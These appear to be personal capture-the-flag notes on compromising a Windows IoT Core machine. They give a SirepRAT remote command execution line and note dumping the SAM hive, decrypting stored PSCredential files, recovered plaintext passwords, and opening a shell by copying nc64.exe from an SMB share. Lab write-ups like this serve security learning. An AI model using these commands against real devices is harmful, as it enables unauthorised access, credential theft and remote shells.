#### ++ INFO ++
-> We found Windows IoT Core
-> With RCE we dump SAM as system (Do not use `as_logged_on_user` flag)
-> User flag is stored as PSCredentials so we have to decrypt the file with the following command
	`(Import-CliXml -Path C:\Data\Users\app\user.txt).GetNetworkCredential() | fl`
-> Admin credentials are stored as PSCredentials in `C:\Data\Users\app\iot-admin.xml`

#### ++ Credentials ++
	app : mesh5143
	administrator : _1nt3rn37ofTh1nGz

	Copying a nc64.exe binary with an smb share we can get a shell executing the script as the following (DO NOT USE as_logged_on_user FLAG):
		python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c <Command here>"
